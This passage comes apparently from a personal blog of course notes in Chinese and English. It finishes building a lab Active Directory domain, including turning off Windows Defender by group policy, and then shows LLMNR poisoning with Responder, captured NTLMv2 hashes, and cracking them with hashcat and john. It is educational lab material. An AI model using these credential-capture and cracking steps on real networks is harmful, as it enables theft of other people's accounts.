HOST/HYDRA-DC.MARVEL.<span class="built_in">local</span>/MARVEL</span><br><span class="line">        HOST/HYDRA-DC</span><br><span class="line">        HOST/HYDRA-DC.MARVEL.<span class="built_in">local</span></span><br><span class="line">        HOST/HYDRA-DC.MARVEL.<span class="built_in">local</span>/MARVEL.<span class="built_in">local</span></span><br><span class="line">        E3514235-4B06-11D1-AB04-00C04FC2DCD2/ff28a91a-7cfe-4680-84a0-e7ccfe7f8feb/MARVEL.<span class="built_in">local</span></span><br><span class="line">        ldap/HYDRA-DC/MARVEL</span><br><span class="line">        ldap/ff28a91a-7cfe-4680-84a0-e7ccfe7f8feb._msdcs.MARVEL.<span class="built_in">local</span></span><br><span class="line">        ldap/HYDRA-DC.MARVEL.<span class="built_in">local</span>/MARVEL</span><br><span class="line">        ldap/HYDRA-DC</span><br><span class="line">        ldap/HYDRA-DC.MARVEL.<span class="built_in">local</span></span><br><span class="line">        ldap/HYDRA-DC.MARVEL.<span class="built_in">local</span>/MARVEL.<span class="built_in">local</span></span><br><span class="line">CN=krbtgt,CN=Users,DC=MARVEL,DC=<span class="built_in">local</span></span><br><span class="line">        kadmin/changepw</span><br><span class="line">CN=SQL Service,CN=Users,DC=MARVEL,DC=<span class="built_in">local</span></span><br><span class="line">        HYDRA-DC/SQLService.MARVEL.<span class="built_in">local</span>:60111</span><br><span class="line"></span><br><span class="line">**Existing SPN found!**</span><br></pre></td></tr></table></figure>

<ul>
<li>存在<strong>Kerberos rusting attack risk</strong></li>
<li>只需一個網域帳戶即可執行 Kerberoasting，**服務主體名稱 (SPN)**可以請求 - 任何人都可以執行此操作</li>
<li>Kerberos 驗證使用 SPN 將服務實例與使用者帳戶關聯。</li>
<li>這允許客戶端應用程式要求服務對帳戶進行身份驗證，即使客戶端不知道帳戶名稱也是如此。</li>
<li>當提供指定一個<strong>SPN 的TGS 請求</strong>並且該 SPN 已在 Active Directory 中註冊時，網域控制站會提供一張票證。該票證包含執行該服務的帳戶的<strong>金鑰</strong>。有了這些訊息，攻擊者現在就可以嘗試使用票據離線<strong>暴力攻擊</strong>進行破解，從而獲取用戶的明文密碼。</li>
</ul>
<p>設定Group policy</p>
<ul>
<li>pushing for the entire domain</li>
<li>搜索框搜尋Group</li>
<li>Specifically create GPOs for specific groups or users &gt; do it for whole domain</li>
</ul>
<p><img src="/img/ADLAB_Untitled_47.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_48.png" alt="Untitled"></p>
<p>going to disable Windows Defender in this environment &gt; attacker can run all attacks</p>
<ul>
<li>where is antivirus going to get picked up if run an attack</li>
</ul>
<p><img src="/img/ADLAB_Untitled_49.png" alt="Untitled"></p>
<p>找到Microsoft Defender Antivirus &gt; Turn off Microsoft Defender Antivirus</p>
<ul>
<li>再更早版本的winser含2019 &gt; Windows Defender Antivirus</li>
</ul>
<p><img src="/img/ADLAB_Untitled_50.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_51.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_52.png" alt="Untitled"></p>
<p>回到GPO設定 &gt; Disable Windows Defender &gt; Enforced</p>
<ul>
<li>anytime that user joins the domain or a computer joins the domain, it’s going to get this policy</li>
<li>or when the policy updates on that computer, If it’s already domain joined, it will get this policy as will</li>
<li>So this will disable defender once we join the domain with our computers</li>
</ul>
<p><img src="/img/ADLAB_Untitled_53.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_54.png" alt="Untitled"></p>
<p>Make sure this machine have IP address</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator&gt;ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP Configuration</span><br><span class="line"></span><br><span class="line">Ethernet adapter Ethernet0:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : localdomain</span><br><span class="line">   Link-<span class="built_in">local</span> IPv6 Address . . . . . : fe80::6da1:be85:db3e:51ea%6</span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 192.168.19.148</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Default Gateway . . . . . . . . . : 192.168.19.2</span><br></pre></td></tr></table></figure>

<p>或是手動設置IP地址</p>
<p><img src="/img/ADLAB_Untitled_55.png" alt="Untitled"></p>
<p>這台機器不需要聯網，所以設置靜態IP給他</p>
<p><img src="/img/ADLAB_Untitled_56.png" alt="Untitled"></p>
<h2 id="Joining-Our-Machines-to-the-Domain"><a href="#Joining-Our-Machines-to-the-Domain" class="headerlink" title="Joining Our Machines to the Domain"></a><strong>Joining Our Machines to the Domain</strong></h2><p>兩台win10都要設定</p>
<p>Join these machines to the domain </p>
<ul>
<li>check to make sure that we’re getting all of our policies and that everything’s joined</li>
<li>utilize the accounts that we have for this machine</li>
<li>change the DNS, because need to point this directly at our domain controller</li>
</ul>
<p><img src="/img/ADLAB_Untitled_57.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_58.png" alt="Untitled"></p>
<h3 id="Join-the-domain"><a href="#Join-the-domain" class="headerlink" title="Join the domain"></a>Join the domain</h3><ul>
<li>搜索框打domain &gt; Access work or school &gt;Connect &gt; Join this device to a local Active..</li>
</ul>
<p><img src="/img/ADLAB_Untitled_59.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_60.png" alt="Untitled"></p>
<p>輸入帳號密碼登入</p>
<ul>
<li>username - administrator</li>
<li>passwd - Akali@</li>
</ul>
<p><img src="/img/ADLAB_Untitled_61.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_62.png" alt="Untitled"></p>
<p>back to winser &gt; make sure that actually did join these machines</p>
<p><img src="/img/ADLAB_Untitled_63.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_64.png" alt="Untitled"></p>
<p>兩台win10重登後登入網域下的帳戶，設置相同</p>
<p>並找到 locla users and groups &gt; users &gt; Administrator &gt; Set Password &gt; Proceed &gt; 輸入密碼</p>
<p><img src="/img/ADLAB_Untitled_65.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_66.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_67.png" alt="Untitled"></p>
<p>雙擊Administrator - uncheck Account is disable</p>
<p><img src="/img/ADLAB_Untitled_68.png" alt="Untitled"></p>
<p>Look at the administrators on this computer，並且新增Frank Castle用戶</p>
<ul>
<li>Group &gt; Administrators &gt;Add &gt; Frank Castle</li>
</ul>
<p>THEPUNISHER-2 &gt; Group - Add Frank Castle</p>
<p>SPIDERMAN-2 &gt; Group - Add Peter Parker、Frank Castle</p>
<p><img src="/img/ADLAB_Untitled_69.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_70.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_71.png" alt="THEPUNISHER-2"></p>
<p>THEPUNISHER-2</p>
<p><img src="/img/ADLAB_Untitled_72.png" alt="SPIDERMAN-2"></p>
<p>SPIDERMAN-2</p>
<p>到檔案管理員 &gt; 網路 &gt; 關閉錯誤訊息 &gt; Turn on network discovery and file sharing</p>
<p>點入HYDRA-DC文件能查看到共享文件內容</p>
<p><img src="/img/ADLAB_Untitled_73.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_74.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_75.png" alt="Untitled"></p>
<p>登出當前管理員帳號，登入一般使用者嘗試</p>
<ul>
<li>logon name - .\peterparker</li>
<li>passwd - Akail@</li>
</ul>
<p>文件 &gt; This PC &gt; Computer &gt; Map network..&gt;填入文件位置 <code>\\HYDRA-DC\hackme</code> &gt; 打勾Connect using different credentials &gt; 輸入administrator&#x2F;Akali@</p>
<p><img src="/img/ADLAB_Untitled_76.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_77.png" alt="Untitled"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">WinServer -&gt;</span><br><span class="line">DC name -  HYDRA-DC</span><br><span class="line">Forest - MARVEL.<span class="built_in">local</span></span><br><span class="line">GPO(Group Policy Management) - Disable Windows Defender</span><br><span class="line">IP - 192.168.19.140</span><br><span class="line"></span><br><span class="line">win10 -&gt;</span><br><span class="line">user -&gt; </span><br><span class="line">+ frankcastle/Akali@@</span><br><span class="line">	+ IP - 192.168.19.149</span><br><span class="line">+ peterparker/Akali@@</span><br><span class="line">	+ IP - 192.168.19.150</span><br><span class="line"></span><br><span class="line">useradd -&gt;</span><br><span class="line">+ admin -&gt;</span><br><span class="line">	+ Tony Stark -&gt;</span><br><span class="line">		+ logon name - tstark</span><br><span class="line">		+ passwd - Akali@@</span><br><span class="line">	+ SQL Service -&gt;</span><br><span class="line">		+ logon name - SQL Service</span><br><span class="line">		+ passwd -&gt; MYpassword123#</span><br><span class="line">		+ description leak the passwd</span><br><span class="line"></span><br><span class="line">+ user -&gt;</span><br><span class="line">	+ Frank Castle - &gt;</span><br><span class="line">		+ logon name - fcastle</span><br><span class="line">		+ passwd - Password1</span><br><span class="line">	+ Peter Parker -&gt;</span><br><span class="line">		+ logon name - pparker</span><br><span class="line">		+ passwd - Password1</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-Attacking Active Directory Initial Attack Vectors" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/Attacking%20Active%20Directory%20Initial%20Attack%20Vectors/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.071Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/Attacking%20Active%20Directory%20Initial%20Attack%20Vectors/">
        AD - Initial Attack Vectors
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Attacking-Active-Directory-Initial-Attack-Vectors"><a href="#Attacking-Active-Directory-Initial-Attack-Vectors" class="headerlink" title="Attacking Active Directory: Initial Attack Vectors"></a>Attacking Active Directory: Initial Attack Vectors</h1><hr>
<h3 id="Initial-AD-Attack-Vectors"><a href="#Initial-AD-Attack-Vectors" class="headerlink" title="Initial AD Attack Vectors"></a>Initial AD Attack Vectors</h3><p>攻擊者在網路上植入裝置或將工具上傳到受感染的主機</p>
<p><a target="_blank" rel="noopener" href="https://notes.benheater.com/books/active-directory/chapter/initial-attack-vectors">https://notes.benheater.com/books/active-directory/chapter/initial-attack-vectors</a></p>
<h2 id="LLMNR-Poisoning-Overview"><a href="#LLMNR-Poisoning-Overview" class="headerlink" title="LLMNR Poisoning Overview"></a><strong>LLMNR Poisoning Overview</strong></h2><h3 id="What-is-LLMNR"><a href="#What-is-LLMNR" class="headerlink" title="What is LLMNR?"></a>What is LLMNR?</h3><p><a target="_blank" rel="noopener" href="https://systemweakness.com/what-is-llmnr-poisoning-attack-and-how-to-secure-against-it-417f3b415e51">https://systemweakness.com/what-is-llmnr-poisoning-attack-and-how-to-secure-against-it-417f3b415e51</a></p>
<p><a target="_blank" rel="noopener" href="https://stridergearhead.medium.com/llmnr-poisoning-an-ad-attack-1265f5365332">https://stridergearhead.medium.com/llmnr-poisoning-an-ad-attack-1265f5365332</a></p>
<ul>
<li>Used to identify hosts when DNS fails to do so</li>
<li>Linux 系統通過systemd實現該協議，通過5355端口進行通訊</li>
<li>IPV4 、IPV6通過此協議對同一本地鍊路上的主機執行名稱解析</li>
<li>Windows 用來在網路中 DNS 請求失敗時將主機名稱解析為 IP 位址的兩種名稱服務</li>
<li>用於在 DNS 無法識別主機時識別主機</li>
<li>Previously NBT-NS</li>
<li>主要缺陷是，服務在適當回應時會利用使用者的使用者名稱和 NTLMv2 雜湊值</li>
<li>一台電腦嘗試解析特定主機而 DNS 無法解析，則該電腦將使用 LLMNR 與網路中的其他電腦進行通信，並詢問是否有人知道該特定主機</li>
<li>它將請求廣播到連接到本地網路的每個系統</li>
<li>如果本地網路上有任何受感染的機器，預設情況下它也會收到主機查詢請求，並且受感染的機器也可以將回應傳送到受害機器。反過來，詢問受害者的密碼雜湊值</li>
</ul>
<p><img src="/img/ADInitial_Untitled.png" alt="Untitled"></p>
<p><img src="/img/ADInitial_Untitled_1.png" alt="Untitled"></p>
<h3 id="Run-Responder"><a href="#Run-Responder" class="headerlink" title="Run Responder"></a>Run Responder</h3><p><a target="_blank" rel="noopener" href="https://www.kali.org/tools/responder/">https://www.kali.org/tools/responder/</a></p>
<ul>
<li>基本協議 鏈路本地多播名稱解析 <code>LLMNR</code>、名稱伺服器 <code>NBNS</code>、協議和多播 <code>MDNS</code> - Windows 默認開啟<ul>
<li>如果Hosts檔案裡面不存在，就會使用DNS解析。如果DNS解析失敗，就會使用LLMNR解析；如果LLMNR解析失敗，就會使用NBNS解析<ul>
<li>Hosts &gt;DNS (cache &#x2F; server)&gt;LLMNR&gt;NBNS</li>
<li>LLMNR - UDP&#x2F;5355</li>
</ul>
</li>
<li>NetBIOS在WindowsNT以後的所有作業系統上均可使用，而只有WindowsVista和更高版本才支援LLMNR</li>
<li>主要作用都是在 DNS 伺服器解析失敗後，嘗試對 windows 主機名稱進行解析</li>
<li>正因為預設啟用、且實作方式又類似於ARP 協議，並沒有一個認證的過程，所以就會引發各種基於這兩種協議的欺騙行為</li>
<li>Responder 正是透過這種方式，欺騙受害機器，並使受害機器在後續認證中發送其憑證</li>
</ul>
</li>
<li>不用透過漏洞利用來取得權限的一種方法</li>
<li>透過監聽網絡 &gt; 他人訪問虛假的共享文件地址 &gt; 獲得系統登錄口令的哈希值 &gt;  通過腳本進行hash爆破就可以獲得口令 &gt; 通過ipc建立空連接獲得系統權限</li>
<li>windows 基於NTLM 認證的有SMB、HTTP、LDAP、MSSQL 等，responder 可以透過模擬正常的SMB 協定而獲得受害機器的NTLMV2 hash 值</li>
<li>NTLM v2 不能直接應用於Pass The Hash 攻擊，只能透過暴力破解來取得明文密碼</li>
<li>攻擊者取得 NTLMv1 hash 後，可以直接還原出 NTLM HASH，這樣的話就可以將 NTLM HASH 直接用於 Pass The Hash 攻擊</li>
<li>“協定欺騙”+“模擬服務”，先透過 NBNS、LLMNR 或 MDNS 協定進行欺騙，將流量轉到本機，再透過服務互動來取得 hash 值</li>
<li>攻擊者可以直接通過LM Hash和NTLM Hash訪問遠程主機或服務，而不用提供明文密碼</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> responder -I tun0 -dwP</span><br><span class="line"><span class="comment"># -I 指定網卡</span></span><br><span class="line"><span class="comment"># -d 啟用Debug模式，輸出更詳細調試訊息</span></span><br><span class="line"><span class="comment"># -w 指定启用WPAD代理服务器功能，使得Responder会回复客户端的WPAD请求，从而尝试获取客户端的凭据。</span></span><br><span class="line"><span class="comment"># -P 啟用HTTP回復功能，允許Responder再收到NTLM時回復HTTP 401 Unauthorized回應，從而嘗試獲取用戶憑據</span></span><br><span class="line"><span class="comment"># -v Increase verbosity 沒開啟可能沒法captured hash</span></span><br></pre></td></tr></table></figure>

<p>wpad中間人攻擊 : <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1871187">https://cloud.tencent.com/developer/article/1871187</a></p>
<h2 id="Capturing-Hashes-with-Responder"><a href="#Capturing-Hashes-with-Responder" class="headerlink" title="Capturing Hashes with Responder"></a><strong>Capturing Hashes with Responder</strong></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **responder -I eth0 -dwv</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line"><span class="comment">#確認服務開啟狀況**</span></span><br><span class="line">[+] Servers:</span><br><span class="line">    **HTTP server                [ON]**</span><br><span class="line">    HTTPS server               [ON]</span><br><span class="line">    WPAD proxy                 [ON]</span><br><span class="line">    Auth proxy                 [OFF]</span><br><span class="line">    **SMB server                 [ON]**</span><br><span class="line">    Kerberos server            [ON]</span><br><span class="line">    SQL server                 [ON]</span><br><span class="line">    FTP server                 [ON]</span><br><span class="line">    IMAP server                [ON]</span><br><span class="line">    POP3 server                [ON]</span><br><span class="line">    SMTP server                [ON]</span><br><span class="line">    DNS server                 [ON]</span><br><span class="line">    LDAP server                [ON]</span><br><span class="line">    MQTT server                [ON]</span><br><span class="line">    RDP server                 [ON]</span><br><span class="line">    DCE-RPC server             [ON]</span><br><span class="line">    WinRM server               [ON]</span><br><span class="line">    SNMP server                [OFF]</span><br><span class="line">**#確認在對的網卡上運行**</span><br><span class="line">[+] Generic Options:</span><br><span class="line">    Responder NIC              [eth0]</span><br><span class="line">    Responder IP               [192.168.19.130]</span><br><span class="line">    Responder IPv6             [fe80::20c:29ff:fe76:7735]</span><br><span class="line">    Challenge <span class="built_in">set</span>              [random]</span><br><span class="line">    Don<span class="string">&#x27;t Respond To Names     [&#x27;</span>ISATAP<span class="string">&#x27;, &#x27;</span>ISATAP.LOCAL<span class="string">&#x27;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Current Session Variables:</span></span><br><span class="line"><span class="string">    Responder Machine Name     [WIN-2YV65QKNUWI]</span></span><br><span class="line"><span class="string">    Responder Domain Name      [1LBD.LOCAL]</span></span><br><span class="line"><span class="string">    Responder DCE-RPC Port     [49457]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Listening for events...                                                                                                                      </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[PROXY] Received connection from 192.168.19.1</span></span><br><span class="line"><span class="string">[PROXY] Returning unmodified HTTP response</span></span><br><span class="line"><span class="string">[PROXY] Returning unmodified HTTP response</span></span><br><span class="line"><span class="string">[PROXY] Returning unmodified HTTP response</span></span><br><span class="line"><span class="string">[*] [DHCP] Found DHCP server IP: 192.168.19.254, now waiting for incoming requests...</span></span><br></pre></td></tr></table></figure>

<p>getting some events occurring </p>
<ul>
<li>simulate an event occuring</li>
<li>generate some of LLMR traffic - fake it - attack</li>
</ul>
<p>Go to THEPUNISHER-2 VM login the </p>
<ul>
<li>logon name - fcastle</li>
<li>passwd - Akali@@</li>
</ul>
<p>when we get loggin here, going to explore and navigate to attacker IP address</p>
<p><img src="/img/ADInitial_Untitled_2.png" alt="Untitled"></p>
<p>輸入後kali的responder會captured hashes - NTLMv2 hash</p>
<ul>
<li>can see what IP address came from</li>
</ul>
<p><img src="/img/ADInitial_Untitled_3.png" alt="Untitled"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">....</span><br><span class="line">[PROXY] Returning unmodified HTTP response</span><br><span class="line">[SMB] NTLMv2-SSP Client   : **192.168.19.149**</span><br><span class="line">[SMB] NTLMv2-SSP Username : MARVEL\fcastle</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : **fcastle::MARVEL:1c279671420f45c3:DEDDBB842C3D7AD7F911F8345A97C415:010100000000000000DA75D2C162DA015F83122A885FB6290000000002000800420044003700490001001E00570049004E002D004800550056004200370059005000430054004F00460004003400570049004E002D004800550056004200370059005000430054004F0046002E0042004400370049002E004C004F00430041004C000300140042004400370049002E004C004F00430041004C000500140042004400370049002E004C004F00430041004C000700080000DA75D2C162DA0106000400020000000800300030000000000000000100000000200000436D69EED3EB5B35E7DC93EEFEF7628B4ED7CF218E8932D5B2B957767139D9F90A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00310039002E003100330030000000000000000000**                                                                                                                                        </span><br><span class="line">[SMB] NTLMv2-SSP Client   : 192.168.19.149</span><br><span class="line">[SMB] NTLMv2-SSP Username : MARVEL\fcastle</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:0fb699ba875964a8:2C4B513447026AB49B757D8A4E41B1D3:010100000000000000DA75D2C162DA01DB87411B07EA9AE30000000002000800420044003700490001001E00570049004E002D004800550056004200370059005000430054004F00460004003400570049004E002D004800550056004200370059005000430054004F0046002E0042004400370049002E004C004F00430041004C000300140042004400370049002E004C004F00430041004C000500140042004400370049002E004C004F00430041004C000700080000DA75D2C162DA0106000400020000000800300030000000000000000100000000200000436D69EED3EB5B35E7DC93EEFEF7628B4ED7CF218E8932D5B2B957767139D9F90A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00310039002E003100330030000000000000000000                                                                                                                                        </span><br><span class="line">[SMB] NTLMv2-SSP Client   : 192.168.19.149</span><br><span class="line">[SMB] NTLMv2-SSP Username : MARVEL\fcastle</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:75ac5d61d0467955:3803152E929D39CC9C21EC574086B8C7:010100000000000000DA75D2C162DA010A1F43A5E34B5A780000000002000800420044003700490001001E00570049004E002D004800550056004200370059005000430054004F00460004003400570049004E002D004800550056004200370059005000430054004F0046002E0042004400370049002E004C004F00430041004C000300140042004400370049002E004C004F00430041004C000500140042004400370049002E004C004F00430041004C000700080000DA75D2C162DA0106000400020000000800300030000000000000000100000000200000436D69EED3EB5B35E7DC93EEFEF7628B4ED7CF218E8932D5B2B957767139D9F90A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00310039002E003100330030000000000000000000                                                                                                                                        </span><br><span class="line">[SMB] NTLMv2-SSP Client   : 192.168.19.149</span><br><span class="line">[SMB] NTLMv2-SSP Username : MARVEL\fcastle</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:a462b96d5ffe3f59:B045571CC58C7B5B73FA788498602F61:010100000000000000DA75D2C162DA01D7E4E1A6E08A7AB90000000002000800420044003700490001001E00570049004E002D004800550056004200370059005000430054004F00460004003400570049004E002D004800550056004200370059005000430054004F0046002E0042004400370049002E004C004F00430041004C000300140042004400370049002E004C004F00430041004C000500140042004400370049002E004C004F00430041004C000700080000DA75D2C162DA0106000400020000000800300030000000000000000100000000200000436D69EED3EB5B35E7DC93EEFEF7628B4ED7CF218E8932D5B2B957767139D9F90A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00310039002E003100330030000000000000000000</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>If passwd is weak, we can actually take this hash and crack </p>
<h3 id="Cracking-Our-Captured-Hashes"><a href="#Cracking-Our-Captured-Hashes" class="headerlink" title="Cracking Our Captured Hashes"></a><strong>Cracking Our Captured Hashes</strong></h3><p>將hash存到檔案中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nano hash.txt                 </span><br><span class="line">                                                                                                                                                 </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# <span class="built_in">cat</span> hash.txt  </span><br><span class="line">fcastle::MARVEL:a462b96d5ffe3f59:B045571CC58C7B5B73FA788498602F61:010100000000000000DA75D2C162DA01D7E4E1A6E08A7AB90000000002000800420044003700490001001E00570049004E002D004800550056004200370059005000430054004F00460004003400570049004E002D004800550056004200370059005000430054004F0046002E0042004400370049002E004C004F00430041004C000300140042004400370049002E004C004F00430041004C000500140042004400370049002E004C004F00430041004C000700080000DA75D2C162DA0106000400020000000800300030000000000000000100000000200000436D69EED3EB5B35E7DC93EEFEF7628B4ED7CF218E8932D5B2B957767139D9F90A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00310039002E003100330030000000000000000000</span><br></pre></td></tr></table></figure>

<p>Going to attempt to crack hash</p>
<p>using a tool <code>hashcat</code> or <code>john the ripper</code> </p>
<ul>
<li>hashcat<ul>
<li>破解速度快</li>
<li>經過最佳化</li>
<li>密碼恢復工具，也可以用於安全測試（例如密碼破解、暴露缺陷）</li>
<li>提供了多種破解模式，包括暴力破解、字典、組合、混合和遮罩攻擊等</li>
<li>能夠一次爆破多組雜湊值，在同個系統裡不同裝置上運作。</li>
</ul>
</li>
<li>john the ripper<ul>
<li>識別和處理各種hash格式的能力</li>
<li>自動偵測hash類型</li>
<li>擅長處理更複雜或不常見的雜湊格式</li>
<li>用於尋找和破解弱密碼</li>
</ul>
</li>
</ul>
<p>這邊選擇hashcat</p>
<ul>
<li><code>-m</code>指定輸入要爆破密碼的值為哪種加密格式， <code>5600</code> 為NTLMv2的雜湊演算法</li>
<li>最常見的雜湊方式為MD5，如果是要破解此演算法輸入<code>-m 0</code></li>
<li>要選擇其他雜湊可以 <code>hashcat --help</code> 選擇左側編號</li>
</ul>
<p><img src="/img/ADInitial_Untitled_4.png" alt="Untitled"></p>
<ul>
<li><code>-a</code>指定哪種爆破模式，0:直接字典破解 1:組合破解 3:暴力破解，</li>
</ul>
<p>Here can see what are the modules here for NTLM</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **hashcat --<span class="built_in">help</span> | grep NTLM**</span><br><span class="line">   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol</span><br><span class="line">  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol</span><br><span class="line">   **5600 | NetNTLMv2**                                                  | Network Protocol</span><br><span class="line">  27100 | NetNTLMv2 (NT)                                             | Network Protocol</span><br><span class="line">   1000 | NTLM</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt**</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">Password1        (fcastle)     </span><br><span class="line">1g 0:00:00:00 DONE (2024-02-19 02:48) 50.00g/s 204800p/s 204800c/s 204800C/s paris..soccer8</span><br><span class="line">Use the <span class="string">&quot;--show --format=netntlmv2&quot;</span> options to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br><span class="line">                                                                                                                                       </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force</span><br><span class="line"><span class="comment">#或是使用這條指令將密碼輸出到指定文件</span></span><br><span class="line"><span class="comment">#hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --show -o cra.txt</span></span><br><span class="line"><span class="comment"># -O 加速破解**</span></span><br><span class="line">hashcat (v6.2.6) starting</span><br><span class="line"></span><br><span class="line">You have enabled --force to bypass dangerous warnings and errors!</span><br><span class="line">This can hide serious problems and should only be <span class="keyword">done</span> when debugging.</span><br><span class="line">Do not report hashcat issues encountered when using --force.</span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="comment">#1 [The pocl project]</span></span><br><span class="line">==================================================================================================================================================</span><br><span class="line">* Device <span class="comment">#1: cpu-haswell-AMD Ryzen 7 4800H with Radeon Graphics, 2901/5866 MB (1024 MB allocatable), 4MCU</span></span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Optimizers applied:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Not-Iterated</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line"></span><br><span class="line">ATTENTION! Pure (unoptimized) backend kernels selected.</span><br><span class="line">Pure kernels can crack longer passwords, but drastically reduce performance.</span><br><span class="line">If you want to switch to optimized kernels, append -O to your commandline.</span><br><span class="line">See the above message to find out about the exact limits.</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger <span class="built_in">set</span> to 90c</span><br><span class="line"></span><br><span class="line">Host memory required <span class="keyword">for</span> this attack: 1 MB</span><br><span class="line"></span><br><span class="line">Dictionary cache hit:</span><br><span class="line">* Filename..: /usr/share/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344394</span><br><span class="line">* Bytes.....: 139921559</span><br><span class="line">* Keyspace..: 14344394</span><br><span class="line"></span><br><span class="line">FCASTLE::MARVEL:bfafc4dcd07cc85c:ee3d25fd4dea961e4c49b0696986ed33:0101000000000000005a17d6dd62da0131f6f69cc44da89800000000020008004b0043004c00320001001e00570049004e002d00330046004800360057004f005100360050003100570004003400570049004e002d00330046004800360057004f00510036005000310057002e004b0043004c0032002e004c004f00430041004c00030014004b0043004c0032002e004c004f00430041004c00050014004b0043004c0032002e004c004f00430041004c0007000800005a17d6dd62da0106000400020000000800300030000000000000000100000000200000436d69eed3eb5b35e7dc93eefef7628b4ed7cf218e8932d5b2b957767139d9f90a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00310039002e003100330030000000000000000000:**Password1**</span><br><span class="line">                                                          </span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Mode........: 5600 (NetNTLMv2)</span><br><span class="line">Hash.Target......: FCASTLE::MARVEL:bfafc4dcd07cc85c:ee3d25fd4dea961e4c...000000</span><br><span class="line">Time.Started.....: Mon Feb 19 02:48:25 2024, (0 secs)</span><br><span class="line">Time.Estimated...: Mon Feb 19 02:48:25 2024, (0 secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span 